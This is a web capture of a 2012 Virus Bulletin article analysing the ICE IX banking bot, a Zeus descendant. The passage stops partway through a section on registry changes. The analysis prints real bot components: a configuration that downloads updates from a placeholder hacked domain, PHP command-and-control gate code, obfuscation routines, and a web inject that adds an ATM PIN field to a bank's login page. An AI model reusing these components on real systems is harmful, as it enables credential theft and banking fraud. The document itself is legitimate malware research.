<!DOCTYPE html>
<html lang="en" class="no-js">
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

<script type="text/javascript">var BOOTSTRAP_VERSION ="lumen";
	var BOOTSTRAP_JS_HEAD =1;
	var BOOTSTRAP_CDN_ENABLE =0; var BOOTSTRAP_NAVBAR_TYPE =0; var BOOTSTRAP_LOGO_OPTION =0; var BOOTSTRAP_NAVBAR =1; var BootstrapInputFix =true;var BootstrapNavbarLineHeightFix =true;var BOOTSTRAP_EDT= 0; </script>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<title>Virus Bulletin :: Inside the ICE IX bot, descendent of Zeus</title>
<meta name="description" content="Aditya Sood and colleagues present an analysis of ICE IX bot, a descendent of the Zeus bot which demonstrates how one bot can give rise to another." />
<meta name="generator" content="concrete5 - 5.6.3.5" />
<script type="text/javascript">
var CCM_DISPATCHER_FILENAME = '/index.php';var CCM_CID = 1956;var CCM_EDIT_MODE = false;var CCM_ARRANGE_MODE = false;var CCM_IMAGE_PATH = "/concrete/images";
var CCM_TOOLS_PATH = "/index.php/tools/required";
var CCM_BASE_URL = "https://www.virusbulletin.com";
var CCM_REL = "";

</script>
<link rel="shortcut icon" href="/files/8914/5459/9485/VBIcon.png" type="image/x-icon" />
<link rel="icon" href="/files/8914/5459/9485/VBIcon.png" type="image/x-icon" />
<link rel="stylesheet" type="text/css" href="/concrete/css/ccm.base.css" />
<script type="text/javascript" src="/concrete/js/jquery.js"></script>
<script type="text/javascript" src="/concrete/js/ccm.base.js"></script>
<script type="text/javascript">
var COOKIES_ALLOWED=false;
</script>
<link rel="stylesheet" type="text/css" href="/packages/free_cookies_disclosure/css/cookies_disclosure.css" />
<!--[if lte IE 8]><link rel="stylesheet" type="text/css" href="/packages/free_cookies_disclosure/css/cookies_disclosure_ie.css" /><![endif]-->
<script type="text/javascript">
var COOKIES_DISCLOSURE_HIDE_INTERVAL=10;
</script>
<script type="text/javascript" src="/packages/free_cookies_disclosure/js/disclosure_hide.js"></script>
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/lumen/bootstrap.css" />
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/lumen/bootstrap-overwrites.css" />
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/css/members.css" />
<script type="text/javascript" src="/packages/bootstrap/js/common/prettify.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/jquery.easing.1.3.js"></script>
<script type="text/javascript" src="/packages/bootstrap/js/common/bootstrap.min.js"></script>
<link rel="stylesheet" type="text/css" href="/libraries/css/jquery.fancybox.css" />
<script type="text/javascript" src="/libraries/js/jquery.fancybox.pack.js"></script>
<link rel="stylesheet" media="screen" type="text/css" href="/files/cache/css/bootstrap/typography.css" />
<script type="text/javascript" src="/index.php/tools/packages/free_cookies_disclosure/disclosure_i18n_js"></script>
<script type="text/javascript" src="/packages/free_cookies_disclosure/js/disclosure_ajax_form.js"></script>
<link rel="stylesheet" type="text/css" href="/concrete/blocks/page_list/view.css" />
<link rel="stylesheet" type="text/css" href="/packages/remo_expand/blocks/remo_expand/templates/vbexpand/view.css" />
<script type="text/javascript" src="/packages/remo_expand/js/jquery.color.js"></script>
<script type="text/javascript" src="/packages/remo_expand/js/jquery.ba-hashchange.js"></script>
<script type="text/javascript" src="/packages/remo_expand/js/remo.expand.js"></script>
<link rel="stylesheet" type="text/css" href="/packages/bootstrap/blocks/search/templates/VB_global_search/view.css" />
<link rel="stylesheet" type="text/css" href="/packages/travisn_spacer/css/ccm.tnspacer.css" />

<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css" integrity="sha384-T8Gy5hrqNKT+hzMclPo118YTQO6cYprQmhrYwIiQ/3axmI1hQomh7Ud2hPOy8SP1" crossorigin="anonymous">

<script src="https://cdnjs.cloudflare.com/ajax/libs/prettify/r298/run_prettify.js" integrity="sha256-1SFdTXlsw0RkQ+iO0E91LDshGiIbPiTYqJto0px4wds=" crossorigin="anonymous"></script>
<!--[if gte IE 9]>
<script src="/packages/bootstrap/js/common/modernizr.js"></script>
<![endif]-->

<!--[if lt IE 9]>	
	
	<script src="/packages/bootstrap/js/common/html5shiv.js"></script>
	<script src="/packages/bootstrap/js/common/respond.min.js"></script>
	
<![endif]-->
</head>
<body data-spy="scroll" data-target=".bs-sidebar">

<div class="navbar  navbar-fixed-top navbar-default  bs-docs-nav">
<div class="navbar-inner">
<div class="container"><div class="row"><div class="col-sm-4 col-md-4 logo-position-1 col-logo">
<div class="navbar-header">
<button type="button" class="navbar-toggle btn_navbar_custom">
<span class="icon-bar"></span>
<span class="icon-bar"></span>
<span class="icon-bar"></span>
</button><div class="mobile-clearfix"></div><div class="navbar-brand navbar-brand-area"><a href="/"><img border="0" class="ccm-image-block" alt="" src="/files/4614/4535/7515/logo-big.png" width="339" height="92" /></a></div> </div>
</div><div class="col-sm-8 col-md-8 logo-position-1 col-nav"> <div class="nav-collapse collapse nav_collapse_custom navbar-collapse"> <div style="clear:both"></div>
<div class="vb-global-search-div">
<form action="/index.php/global-search-results/" method="get">
<fieldset>
<input name="search_paths[]" type="hidden" value="" />
<input name="query" type="text" class="vb-global-search" placeholder="Search site..." />
<input name="submit" type="submit" value="Search!" style="display:none" />
</fieldset>
</form>
</div>
<div class="tnSpacer" style="height:48px"></div>
<ul class="nav nav-pills"><li class=" nav-first nav-item-6299"><a href="/newsletter/" target="_self" class=" nav-first nav-item-6299 ">Newsletter</a></li><li class=" nav-item-260"><a href="/conference/" target="_self" class=" nav-item-260 ">VB Conference</a></li><li class=" nav-item-166"><a href="/testing/" target="_self" class=" nav-item-166 ">VB Testing</a></li><li class=" nav-path-selected active nav-item-160"><a href="/virusbulletin/" target="_self" class=" nav-path-selected active nav-item-160 ">Bulletin</a></li><li class=" nav-last nav-item-130"><a href="/blog/" target="_self" class=" nav-last nav-item-130 ">Blog</a></li></ul> </div>
</div>
</div><div class="clearfix"></div>
</div>
</div>
</div>
<div class="navbar-top-fixed-space "><div class="clearfix"></div></div>

<div class="container m-top-20">
<div class="row">
<div class="col-md-9 col-sm-9 col-lg-9">
<div class="titlepage" xmlns=""><div><div><h1 class="title" xmlns="http://www.w3.org/1999/xhtml"><a id="vb201208-ICE-bot"></a>Inside the ICE IX bot, descendent of Zeus</h1></div><div><p class="pubdate" xmlns="http://www.w3.org/1999/xhtml">2012-08-01</p></div><div><div class="authorgroup" xmlns="http://www.w3.org/1999/xhtml"><div class="author titlepage"><h3 class="author"><span class="surname">Aditya K. Sood</span></h3><span class="orgname">Michigan State University</span>, <span class="orgdiv">USA</span></div><div class="author titlepage"><h3 class="author"><span class="firstname">Richard J.</span> <span class="surname">Enbody</span></h3><span class="orgname">Michigan Stat University</span>, <span class="orgdiv">USA</span></div><div class="author titlepage"><h3 class="author"><span class="firstname">Rohit</span> <span class="surname">Bansal</span></h3><span class="orgname">SecNiche Security Labs</span>, <span class="orgdiv">USA</span></div><b class="editedby">Editor: </b><span class="editor"><span class="firstname">Helen</span> <span class="surname">Martin</span></span></div></div><div><div class="abstract" xmlns="http://www.w3.org/1999/xhtml"><p class="title"><b>Abstract</b></p><p>Aditya Sood and colleagues present an analysis of ICE IX bot, a descendent of the Zeus bot which demonstrates how one bot can give rise to another.</p></div></div><div><p class="copyright" xmlns="http://www.w3.org/1999/xhtml"><i>Copyright &copy; 2012 Virus Bulletin</i></p></div></div><hr /></div>
<div class="ccm-remo-expand">
<div id="ccm-remo-expand-title-3236" class="ccm-remo-expand-title ccm-remo-expand-closed" data-expander-speed="200">Table of contents</div><div id="ccm-remo-expand-content-3236" class="ccm-remo-expand-content"><div class="toc"><dl><dt><span class="sect1"><a href="#id3332289"></a></span></dt><dt><span class="sect1"><a href="#id3908061">ICE bot building and configuration</a></span></dt><dt><span class="sect1"><a href="#id4203424">Understanding the gate communication</a></span></dt><dt><span class="sect1"><a href="#id2654354">ICE bot web injects</a></span></dt><dt><span class="sect1"><a href="#id4663023">ICE bot &ndash; form grabbing</a></span></dt><dt><span class="sect1"><a href="#id3038970">Self-destructive code</a></span></dt><dt><span class="sect1"><a href="#id4909931">User-Agent detection</a></span></dt><dt><span class="sect1"><a href="#id3668619">Certificate deletion process</a></span></dt><dt><span class="sect1"><a href="#id2616898">Registry check and command execution</a></span></dt><dt><span class="sect1"><a href="#id3618388">Backconnect and supporting modules</a></span></dt><dt><span class="sect1"><a href="#id3270985">Conclusion</a></span></dt><dt><span class="sect1"><a href="#id4035396">Appendix: ICE IX bot commands</a></span></dt></dl></div></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3332289"></a></h2></div></div></div><p>The ICE IX bot is considered to be a descendent of the Zeus botnet because it uses some of Zeus&rsquo;s source code. ICE IX communicates using the HTTP protocol, so it can be considered to be a third generation botnet. While it has been used for a variety of purposes, a major threat of ICE IX comes from its manipulation of banking operations on infected machines. As with any bot, infection results in establishing a master-slave relationship between the botmaster and the compromised machine.</p><p>Some researchers do not consider ICE IX to be as effective as Zeus [<span class="citation"><a href="#citation.1">1</a></span>] &ndash; for example because of its code reuse, having fewer features, and so on. ICE IX implements the web injects feature that was the core feature of the Zeus botnet. It also uses some of the interesting code patterns from Zeus&rsquo;s source. For example, the web injects module has been optimized to work effectively with different browsers. ICE IX implements enhanced driver-mode code to bypass firewalls and protection software without raising any alarms. However, ICE IX is still an interesting target for analysis and in this paper we present an analysis of the ICE IX bot version &lt; =1.2.0 to cover its different functionalities.</p><p>The roots of the name ICE IX may lie in literature: William Gibson&rsquo;s 1984 novel <span class="emphasis"><em>Neuromancer</em></span> coined the term &lsquo;ICE&rsquo;, which stood for &lsquo;Intrusion Countermeasure Electronics&rsquo;, and the central theme of Kurt Vonnegut&rsquo;s 1963 novel <span class="emphasis"><em>Cat&rsquo;s Cradle</em></span> was the ice-nine crystal &ndash; which spread to crystallize the water of the world. In the rest of the paper, we will shorten ICE IX to ICE.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3908061"></a>ICE bot building and configuration</h2></div></div></div><p>To configure the ICE bot, several parameters are defined in the file settings.txt. This file contains several sections, each defining various functions of the ICE bot. It is useful to begin with the configuration settings because these expose the bot&rsquo;s capabilities. The different configuration parameters of the ICE bot are as follows:</p><div class="itemizedlist"><ul type="disc"><li><p>autoupdate_path: this parameter defines the path of the executable file (hosted in a remote location) that the ICE bot downloads to update itself when configuration parameters change.</p></li><li><p>receiving_script_path: this parameter defines a path to the gateway that the ICE bot uses to connect back to its Command and Control (C&amp;C) server. ICE uses this connection to pass on information extracted from the compromised machines.</p></li><li><p>injects_file: this parameter defines a path to the web injects file which contains rule sets for altering incoming HTTP responses to inject illegitimate content into web pages.</p></li><li><p>DataGrabFilters: this parameter defines filters for grabbing content in web pages.</p></li><li><p>URLRedirects: this parameter defines redirection rules for particular domains, allowing the browser to serve a fake web page when a legitimate domain name is entered in the address bar.</p></li><li><p>MirrorServers: this parameter defines a path for backup servers that store the different configuration files for the ICE bot. If a primary server becomes unavailable, this option acts as a secure failover so the bot can download other versions of configuration files from mirror (backup) servers.</p></li><li><p>URIMasks: this parameter specifies various masks (a.k.a. rules) for customizing operations on different websites. The &lsquo;N&rsquo; flag specifies that the ICE bot should not write any data in its reports. The &lsquo;S&rsquo; flag instructs the bot to take a screenshot of the web page specified in the URI. The &lsquo;C&rsquo; flag instructs the bot to manage the cookie handling support for the masked URI so it can preserve and delete the cookies associated with the domain. The &lsquo;B&rsquo; flag blocks access to the website specified in the masked URI.</p></li></ul></div><p>A simple example of an ICE bot configuration file is presented in Listing 1 below:</p><pre class="programlisting">{&ldquo;Settings&rdquo;

  <span class="bold"><strong>autoupdate_path</strong></span> &ldquo;http://hacked_domain/bot.exe&amp;rdquo;
 <span class="bold"><strong> receiving_script_path</strong></span> &ldquo;http://hacked_domain/script.php&amp;rdquo;
  <span class="bold"><strong>injects_file</strong></span> &ldquo;web_injects.txt&rdquo;

  {<span class="bold"><strong>&quot;DataGrabFilters&quot;</strong></span>
    ; &ldquo;Http://mail.rambler.ru/ *&rdquo; &ldquo;passw; login&rdquo;
  }

  {&ldquo;<span class="bold"><strong>URLRedirects</strong></span>&rdquo;
     &ldquo;Http://www.rambler.ru&amp;rdquo; &ldquo;http://www.yandex.ru&amp;rdquo; &ldquo;GP&rdquo; &ldquo;&rdquo; &ldquo;&rdquo;
  }
 
  {&ldquo;<span class="bold"><strong>MirrorServers</strong></span>&rdquo;
    &ldquo;http://backup_domain/config_backup_v_1.bin&amp;rdquo;
  }
     URI mask
  {&ldquo;<span class="bold"><strong>URLMasks</strong></span>&rdquo;e 
    &ldquo;Nhttp: / / * wellsfargo.com / *&rdquo;
    &ldquo;Nhttp: / / citibank.com / *&rdquo;
    &ldquo;S * / chase.com / *&rdquo;
    &ldquo;S * / bankofamerica.com / *&rdquo;
  } }


<span class="bold"><strong>Listing 1: Example layout of an ICE bot configuration file.</strong></span></pre><p>Once the configuration parameters have been defined in the settings file, it&rsquo;s time for the builder to generate a bot that uses the following specific build parameters:</p><div class="itemizedlist"><ul type="disc"><li><p>Configuration File &ndash; path to the configuration file containing settings parameters.</p></li><li><p>Configuration File Retrieval Time &ndash; specifies the time interval to be set for successful retrieval of the configuration file from the server.</p></li><li><p>Statistics Retrieval Time &ndash; specifies the time interval for sending information back to the C&amp;C server.</p></li><li><p>Encryption Key &ndash; the RC4 encryption key used for encrypting the configuration file.</p></li><li><p>Certification Deletion &ndash; deletes certificates from the infected machine after installation of the bot.</p></li><li><p>Disable TCP Operations &ndash; stops various TCP servers including SOCKS, VNC, etc. that are used as backconnect servers.</p></li></ul></div><p>Other configuration parameters exist, but the primary ones are those discussed above. (More detail is provided in the appendix.)</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4203424"></a>Understanding the gate communication</h2></div></div></div><p>The gate acts as an interface between the C&amp;C server and the infected machine. The bot connects to the gate, which in turn connects to the C&amp;C server. Thus, the bot does not send information directly to the C&amp;C server, but instead routes it through the intermediate gate. This gate organization provides a more modular architecture and it is possible to host the C&amp;C server on a different domain from the gate. However, the gate and C&amp;C server are usually hosted on the same domain. From a design perspective, gate.php depends on the config.php and global.php files.</p><p>Listing 2 shows how the C&amp;C server sends the configuration file (settings.bin) in response to a request from the bot sent through the gate. The bot sends a unique identifier and a computed hash from the infected machine in the HTTP POST parameters. Once the gate receives the information, it executes the custom code in the config.php file. The configuration module then verifies the hash by recomputing it on the server side. This check validates the successful installation and identity of the bot. The configuration module executes an RC4 encryption routine and implements MD5 on the string returned by the RC4 encryption routine. The identifier ($id) is passed as a parameter to the RC4 encryption with the encryption key (rc4Init ($plainkey)) that was established during the installation of the bot. Once the hash is computed, it is verified against the hash transmitted by the bot. If the hashes match, the C&amp;C server serves the settings.bin file over HTTP as an attachment. The file encoding is always defined as binary and is served as plain text content over HTTP. In this way, the configuration file is sent to the bot in the infected machine. </p><pre class="programlisting">&lt;?php
<span class="bold"><strong>$plainkey=&rsquo;[Encryption key to be used]&rsquo;;
$config_file=&rsquo;settings.bin&rsquo;;</strong></span>

<span class="bold"><strong>$id=$_POST[&lsquo;bn1&rsquo;];
$hash=$_POST[&lsquo;sk1&rsquo;];</strong></span>

$originalId=$id;

function rc4Init($key){-- Redacted --}
function rc4(&amp;$data, $key) {-- Redacted --}

<span class="bold"><strong>rc4($id,rc4Init($plainkey));</strong></span>

$hashtocompare=strtoupper(md5($id));
$data=&rdquo;originalId=$originalId hash=$hash hashtocompare=$hashtocompare\n&rdquo;;

if (<span class="bold"><strong>$hashtocompare==$hash</strong></span>)
     {
     header(&lsquo;Content-Type: text/plain&rsquo;);
     h<span class="bold"><strong>eader(&lsquo;Content-Disposition: attachment; filename=&rsquo; . $config_file);</strong></span>
     header(&lsquo;Content-Length: &lsquo; . filesize($config_file));
     header(&lsquo;Content-Transfer-Encoding: binary&rsquo;);
     readfile($config_file);
     }
else
     {

     header($_SERVER[&lsquo;SERVER_PROTOCOL&rsquo;].&rdquo; 404 Not Found&rdquo;);
     }
?&gt;


<span class="bold"><strong>Listing 2: ICE bot configuration module.</strong></span></pre><p>Our disassembly of the ICE bot binary yielded results similar to those shown in Listing 2. <a href="#figure.1">Figure 1</a> shows how the ICE bot uses variables &lsquo;bn1&rsquo; and &lsquo;sk1&rsquo; to extract information from the infected machine. The &lsquo;bn1&rsquo; variable holds the unique value of an identifier, while the &lsquo;sk1&rsquo; variable holds the hash value.</p><div class="figure"><a id="figure.1"></a><div class="mediaobject"><img alt="Parameters extracting ID and hash information." src="/uploads/images/figures/2012/08/ICEbot-1.jpg" /></div><p class="title"><b>Figure&nbsp;1.&nbsp;Parameters extracting ID and hash information.</b></p></div><p><a href="#figure.2">Figure 2</a> shows how the ICE bot generates the hash. It implements the CryptHashData and CryptCreateHash functions to handle hash operations. The bot keeps sending HTTP POST requests back to the C&amp;C server to notify it of any updates in the system and to send extracted information. The HTTP POST request sent back to the gate is presented in Listing 3.</p><div class="figure"><a id="figure.2"></a><div class="mediaobject"><img alt="Hash generation process." src="/uploads/images/figures/2012/08/ICEbot-2.jpg" /></div><p class="title"><b>Figure&nbsp;2.&nbsp;Hash generation process.</b></p></div><pre class="programlisting">--- Redacted Content ----

POST /private/adm/gate.php HTTP/1.1

Accept: */*

User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 
2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)
Host: 4umf.com

Connection: Keep-Alive

<span class="bold"><strong>.......Nl.&amp;]s.T.(.9.C..R.cF^Zrf.=A....6[..+.aq..f....;^.a.\.w..O?...KFa,X..i....j-
.k..&amp;<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="bd9393db93c4fd93">[email&#160;protected]</a>^N.....43.h..R.0r.g......w.m8..._............h...\@..C.n....3...W....
3..,...0..k..sxp..p...8..|..[ ...AD.&lt;.._.k..&rdquo;!....\..B..;.)..~MZ.;U..]B.R..`..S....
z...a..y..`........N.&gt;E...bD.F....o8d...|...dS..l.l.j....r..H...n.O....`....P.....
w.y..%..Ikj...{........K....6.~...._..^E...UP9..|SN.#.C+...]..U...?..g............
.....ZM.Q0.Z.....!W....Q.s...g.............:z.8..q&rsquo;.q...3......L..M.....0......5&rsquo;m.
......2&gt;.......].c....i..R.S.v..........w..k.\..jU....$....SIV9EWl6.L.`N9*....)...
...?r{.M.kt.IZ.f...6H.......\.4I.....=:l.o..QQ.......yV...</strong></span>

HTTP/1.1 200 OK
Date: Mon, 11 Jun 2012 03:50:51 GMT
Server: Apache/2.2.14 
Connection: Keep-Alive
Content-Type: text/html

<span class="bold"><strong>{.&rdquo;..a1]....S.=.W..t.s.........^@...........RW8V..q.X..w.W...&rsquo;).</strong></span>
 

<span class="bold"><strong>Listing 3: POST request in action.</strong></span></pre><p>Another interesting fact is that the bot generates fake HTTP traffic to google.com/webhp. Whenever the bot sends information back to the gate using HTTP POST requests, it also sends HTTP GET requests to google.com. The result is fake traffic so that the HTTP requests look legitimate. <a href="#figure.3">Figure 3</a> shows how the ICE bot generates traffic.</p><div class="figure"><a id="figure.3"></a><div class="mediaobject"><img alt="ICE bot traffic" src="/uploads/images/figures/2012/08/ICEbot-3.jpg" /></div><p class="title"><b>Figure&nbsp;3.&nbsp;ICE bot traffic</b></p></div><pre class="programlisting">--- Redacted Content ---
if($replyCount &gt; 0)
{
 $replyData = pack(&lsquo;LLLLLLLL&rsquo;, mt_rand(), mt_rand(), mt_rand(), mt_rand(), mt_rand(), HEADER_SIZE + 
strlen($replyData), 0, $replyCount).md5($replyData, true).$replyData;
 visualEncrypt($replyData);
 rc4($replyData, $config[&lsquo;botnet_cryptkey_bin&rsquo;]);
 echo $replyData;
 die();
 }
}

<span class="bold"><strong>function sendEmptyReply()</strong></span>
{
 $replyData = pack(&lsquo;LLLLLLLL&rsquo;, mt_rand(), mt_rand(), mt_rand(), mt_rand(), mt_rand(), HEADER_SIZE + 
ITEM_HEADER_SIZE, 0, 1).&rdquo;\x4A\xE7\x13\x36\xE4\x4B\xF9\xBF\x79\xD2\x75\x2E\x23\x48\x18\xA5\0\0\0\0\0\
0\0\0\0\0\0\0\0\0\0\0&rdquo;;
 visualEncrypt($replyData);
 rc4($replyData, $GLOBALS[&lsquo;config&rsquo;][&lsquo;botnet_cryptkey_bin&rsquo;]);
 echo $replyData;
 die();
}

<span class="bold"><strong>function visualEncrypt(&amp;$data)</strong></span>
{
 $len = strlen($data);
 for($i = 1; $i &lt; $len; $i++)$data[$i] = chr(ord($data[$i]) ^ ord($data[$i - 1]));
}

<span class="bold"><strong>function visualDecrypt(&amp;$data)</strong></span>
{
 $len = strlen($data);
 if($len &gt; 0)for($i = $len - 1; $i &gt; 0; $i--)$data[$i] = chr(ord($data[$i]) ^ ord($data[$i - 1]));
}

<span class="bold"><strong>Listing 4: Data obfuscation.</strong></span></pre><p>Listing 4 shows some of the obfuscation routines implemented in the ICE bot. When the bot sends information to the gate, the C&amp;C can either send an empty reply or one containing some data, depending on the requirements. When the C&amp;C has to send an empty reply, it simply executes sendEmptyReply. To send a reply containing commands and data, the C&amp;C server queries its database and then replies. The C&amp;C server implements its visualEncrypt function to obfuscate the data, followed by an RC4 encryption routine that uses a predefined crypto key to encrypt the full stream and then sends it back to the bot. On receiving the stream of data, the bot implements the decryption routine to extract the command sent by the C&amp;C server. Listing 5 shows an example of the data transmitted over the wire during communication between the bot and the C&amp;C server.</p><pre class="programlisting">\240\321\373c\333\266\262\3433l\201\332\314\022\223D\022X\237\3277\320\272$\241\0250(!\t\035\375\343L\
021F.Qa\031\001&rsquo;&rsquo;@\361\364\233\365J\245\322t\3730U\324}\<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="90a3a6a4d0">[email&#160;protected]</a>\262|\204\212D

\360P\264v\231\303QD\324\206\210\300wV\n

\211\275\311\301\3308\337\265+\256\032?&rsquo;.\006\022\362\354C\036I!^n\026\016((O\376\373\224\372E\252\335
{\364?Z\333r\373O\275s\213\205K
 
<span class="bold"><strong>Listing 5: Obfuscated data &ndash; ICE bot communication.</strong></span></pre><p>We have now covered the communication model of ICE bot.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id2654354"></a>ICE bot web injects</h2></div></div></div><p>ICE bot&rsquo;s web injects are similar to those used by Zeus and SpyEye, except that they have been redesigned and optimized for better performance. They provide improved functionality to inject data with more successful results. Web injection is a technique in which a bot injects malicious content into the incoming HTTP responses. The injected content tricks the user into entering sensitive information. Details of web injects can be found in [<span class="citation"><a href="#citation.2">2</a></span>], [<span class="citation"><a href="#citation.3">3</a></span>]. Listing 6 shows the content from a webinjects.txt file used by an ICE bot to trigger injections.</p><pre class="programlisting">set_url https://online.wellsfargo.com/das/cgi-bin/session.cgi* GL
data_before
&lt;div id=&rdquo;pageIntro&rdquo; class=&rdquo;noprint&rdquo;&gt;

data_end
data_inject
data_end
data_after
&lt;td id=&rdquo;sidebar&rdquo; align=&rdquo;left&rdquo; valign=&rdquo;top&rdquo; class=&rdquo;noprint&rdquo;&gt;
data_end

set_url https://www.wellsfargo.com/* G
data_before
&lt;span class=&rdquo;mozcloak&rdquo;&gt;&lt;input type=&rdquo;password&rdquo;*&lt;/span&gt;
data_end
data_inject
&lt;br&gt;&lt;strong&gt;&lt;label for=&rdquo;atmpin&rdquo;&gt;ATM PIN&lt;/label&gt;:&lt;/strong&gt;&amp;nbsp;&lt;br /&gt;
&lt;span class=&rdquo;mozcloak&rdquo;&gt;&lt;input type=&rdquo;password&rdquo; accesskey=&rdquo;A&rdquo; id=&rdquo;atmpin&rdquo; name=&rdquo;USpass&rdquo; size=&rdquo;13&rdquo; maxlength=&rdquo;14&rdquo; 
style=&rdquo;width:147px&rdquo; tabindex=&rdquo;2&rdquo; /&gt;&lt;/span&gt;
data_end
data_after
data_end
----- Redacted Content -----
 
<span class="bold"><strong>Listing 6: ICE bot web injects in action.</strong></span></pre></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4663023"></a>ICE bot &ndash; form grabbing</h2></div></div></div><p>Form grabbing is another technique implemented by many recent bots. As the name suggests, a bot captures (&lsquo;grabs&rsquo;) all the data in a form when it is submitted using POST requests. This technique is implemented using DLL injection and hooking to implement a man-in-the-middle-style attack within the browser. This attack, known as a man-in-the-browser attack, allows the bot to manipulate the data that is coming in and going out of the system. Form grabbing is a very successful technique for stealing users&rsquo; credentials, and all browsers are vulnerable. This is because form grabbing does not exploit any inherent vulnerabilities or design flaws in the browser components; rather it subverts the integrity of running components by hooking different functions in the browser-specific DLLs. Details of the form grabbing technique can be found in [<span class="citation"><a href="#citation.4">4</a></span>]. The bot hooks wininet.dll and nspr4.dll to subvert the normal operations of <span class="emphasis"><em>Internet Explorer</em></span> (<span class="emphasis"><em>IE</em></span>) and <span class="emphasis"><em>Firefox</em></span> respectively. <a href="#figure.4">Figure 4</a> shows how the stolen information is stored in the C&amp;C after successful form grabbing.</p><div class="figure"><a id="figure.4"></a><div class="mediaobject"><img alt="ICE bot form grabbing in action." src="/uploads/images/figures/2012/08/ICEbot-4.jpg" /></div><p class="title"><b>Figure&nbsp;4.&nbsp;ICE bot form grabbing in action.</b></p></div><p>Because of where it sits, form grabbing works over both HTTP and HTTPS protocols. In addition to stealing data from forms, a similar tactic can be used to grab .sol files (Flash settings) and cookies. The ICE bot also has special built-in grabbers for particular purposes. For example, it has grabbers to extract the credentials from FTP clients such as <span class="emphasis"><em>FlashFXP</em></span>, <span class="emphasis"><em>Total Commander</em></span>, <span class="emphasis"><em>WsFTP</em></span>, <span class="emphasis"><em>FileZilla</em></span>, <span class="emphasis"><em>FAR Manager</em></span>, <span class="emphasis"><em>WinSCP</em></span>, <span class="emphasis"><em>FTP Commander</em></span>, <span class="emphasis"><em>CoreFTP</em></span>, <span class="emphasis"><em>SmartFTP</em></span>, and from mail clients such as <span class="emphasis"><em>Windows Mail</em></span>, <span class="emphasis"><em>Live Mail</em></span> and <span class="emphasis"><em>Outlook</em></span>.</p></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3038970"></a>Self-destructive code</h2></div></div></div><p>ICE bot implements melting, in which it deletes the dropper program after successful installation. The dropper is the malicious binary that was served during a drive-by download attack. Once it has installed the bot, the dropper is no longer needed so it deletes itself. The dropper can also be thought of as a loader because it loads the ICE bot into the system and then removes its initial footprint.</p><p><a href="#figure.5">Figure 5</a> shows a code snippet extracted during analysis of ICE bot. In this snippet, the program has built-in batch instructions that are executed after dropping the bot. One can see that the &lsquo;del&rsquo; command is used with option &lsquo;/F&rsquo; that forcefully deletes the files in the directory.</p><div class="figure"><a id="figure.5"></a><div class="mediaobject"><img alt="Self-destructive code." src="/uploads/images/figures/2012/08/ICEbot-5.jpg" /></div><p class="title"><b>Figure&nbsp;5.&nbsp;Self-destructive code.</b></p></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id4909931"></a>User-Agent detection</h2></div></div></div><p><a href="#figure.6">Figure 6</a> shows that the ICE bot uses its ObtainUserAgentString function to retrieve the default User-Agent string used by the browser in the infected system. Using this information, the details of the infected machine are sent back to the C&amp;C server, including the type of operating system, browser and other environment-specific information. This communication allows the botmaster to understand the state of infected machines and to fine-tune the infection.</p><div class="figure"><a id="figure.6"></a><div class="mediaobject"><img alt="Extracting User-Agent information." src="/uploads/images/figures/2012/08/ICEbot-6.jpg" /></div><p class="title"><b>Figure&nbsp;6.&nbsp;Extracting User-Agent information.</b></p></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id3668619"></a>Certificate deletion process</h2></div></div></div><p>ICE bot uses a built-in <span class="emphasis"><em>Windows</em></span> API function to delete certificates from the certificate store. The motive behind deleting the certificates is to remove the encryption implemented on the end points. Primarily, the bot is interested in deleting certificates that are associated with private keys belonging to the user.</p><p>This allows the bot to remove the identity and authentication information present in certificates. After this, when a user imports a new certificate, these are captured and stored on the C&amp;C server for later use. The process is executed as follows:</p><div class="itemizedlist"><ul type="disc"><li><p>ICE bot opens the certificate store using the CertOpenSystemStore API. It typically has two parameters. The important one is szSubsystemProtocol, which defines the name of the store. There are four different attributes associated with the szSubsystemProtocol: CA refers to the certification authority, ROOT refers to the root certificates, SPC refers to the Software Publishing Certificate and MY points to the certificate store that has certificates associated with private keys. ICE bot uses MY szSubsystemProtocol to query the certificate store.</p></li><li><p>Upon successful opening of the store, ICE bot enumerates the list of certificates using CertEnumCertificatesInStore in a loop. Using CertDuplicateCertificateContext, it duplicates the certificate context which contains a handle to the certificate store. This is done to retrieve a handle for each unique certificate individually, by incrementing and decrementing the reference count.</p></li><li><p>Finally, the ICE bot deletes the certificate from the store using CertDeleteCertificateFromStore, and then closes the store using CertCloseStore.</p></li></ul></div><p>It also implements the PFXExportCertStoreEx function, which exports certificates and associated public keys from the certificate store. Figure 7 shows the certificate deletion process in action.</p><div class="figure"><a id="figure.7"></a><div class="mediaobject"><img alt="Deleting certificates from an infected system." src="/uploads/images/figures/2012/08/ICEbot-7.jpg" /></div><p class="title"><b>Figure&nbsp;7.&nbsp;Deleting certificates from an infected system.</b></p></div></div><div class="sect1" lang="en"><div class="titlepage"><div><div><h2 class="title"><a class="chapter" id="id2616898"></a>Registry check and command execution</h2></div></div></div><p>When an ICE bot is installed, it modifies the registry settings by creating new registry keys. Listing 7 shows the behaviour of ICE bot pertaining to registry modifications and disk operations. 